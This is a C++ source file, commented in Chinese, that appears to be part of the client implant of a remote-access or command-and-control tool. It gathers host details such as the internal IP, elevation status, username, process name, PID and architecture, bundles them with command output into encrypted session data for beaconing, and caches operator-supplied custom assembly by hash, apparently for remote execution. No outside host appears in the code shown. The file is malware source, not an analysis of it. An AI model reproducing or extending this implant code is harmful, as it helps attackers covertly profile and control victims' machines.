#include "pch.h"
#include <vector>
#include <iostream>
#include <ws2tcpip.h>
#include <psapi.h>
#include "single_include/nlohmann/json.hpp"

#include "Cryptor.h"
#include "CommandController.h"

#pragma comment(lib, "ws2_32.lib")

using namespace std;
using json = nlohmann::json;

// 获取内网 IP
void GetPrivateIP(char* privateIP) {
    WSADATA lpWSAData;
    if (WSAStartup(MAKEWORD(2, 2), &lpWSAData)) {
        return;
    }
    char hostName[50] = "";
    if (gethostname(hostName, sizeof(hostName))) {
        WSACleanup();
        return;
    }
    addrinfo hint;
    memset(&hint, 0, sizeof(hint));
    hint.ai_family = AF_INET;
    hint.ai_socktype = SOCK_STREAM;
    addrinfo* addrInfo;
    if (getaddrinfo(hostName, NULL, &hint, &addrInfo)) {
        WSACleanup();
        return;
    }
    if (inet_ntop(AF_INET, &(((struct sockaddr_in*)addrInfo->ai_addr)->sin_addr), privateIP, INET_ADDRSTRLEN) == NULL) {
        freeaddrinfo(addrInfo);
        WSACleanup();
        return;
    }
    freeaddrinfo(addrInfo);
    WSACleanup();
}

// 构造会话信息
SessionInfo GetSessionInfo(string sessionType, string fid, string sid) {
    // 获取内网 IP
    char privateIP[INET_ADDRSTRLEN] = "Unknown";
    GetPrivateIP(privateIP);
    // 获取权限
    DWORD size;
    HANDLE hToken;
    char isAdmin[50] = "";
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION tokenElevation;
        if (GetTokenInformation(hToken, TokenElevation, &tokenElevation, sizeof(tokenElevation), &size)) {
            if (tokenElevation.TokenIsElevated) {
                *isAdmin = '*';
            }
        }
        CloseHandle(hToken);
    }
    // 获取用户名
    char username[50] = "Unknown";
    size = sizeof(username);
    GetUserNameA(username, &size);
    strcat_s(isAdmin, sizeof(isAdmin), username);
    // 获取进程名
    char processName[50] = "Unknown";
    GetModuleBaseNameA(GetCurrentProcess(), NULL, processName, sizeof(processName));
    // 获取 PID
    char pid[10] = "Unknown";
    sprintf_s(pid, sizeof(pid), "%d", GetCurrentProcessId());
    // 获取位数
#if defined(_M_IX86)
    char bit[] = "x86";
#else
    char bit[] = "x64";
#endif
    SessionInfo sessionInfo = { sessionType, fid, sid, privateIP, isAdmin, processName, pid, bit };
    return sessionInfo;
}

// 构造会话数据
string GetSessionData(SessionInfo sessionInfo, vector<SelfAsmInfo> selfAsmInfoVector, vector<ConnectData>& commandOutputDataVector) {
    SessionData sessionData = { sessionInfo, selfAsmInfoVector, commandOutputDataVector };
    commandOutputDataVector.clear();
    string sessionDataString = ((json)sessionData).dump() + to_string(rand() % 10);
    EncryptData(sessionDataString);
    return sessionDataString;
}

// 计算自定义汇编哈希值
string GetSelfAsmHash(string selfAsm) {
    int hash = 0;
    for (int i = 0; selfAsm[i] != '\0'; i++) {
        hash += selfAsm[i];
        hash = (hash << 8) - hash;
    }
    return to_string(hash);
}

// 获取自定义汇编
string GetSelfAsm(string selfAsmOrHash, vector<SelfAsmInfo>& selfAsmInfoVector) {
    for (SelfAsmInfo selfAsmInfo : selfAsmInfoVector) {
        if (!selfAsmInfo.selfAsmHash.compare(selfAsmOrHash)) {
            return selfAsmInfo.selfAsm;
        }
    }
    // 自定义汇编 + Hash -> 自定义汇编信息列表
    string selfAsmHash = GetSelfAsmHash(selfAsmOrHash);
    SelfAsmInfo selfAsmInfo = { selfAsmOrHash, selfAsmHash };
    selfAsmInfoVector.push_back(selfAsmInfo);
    return selfAsmOrHash;
}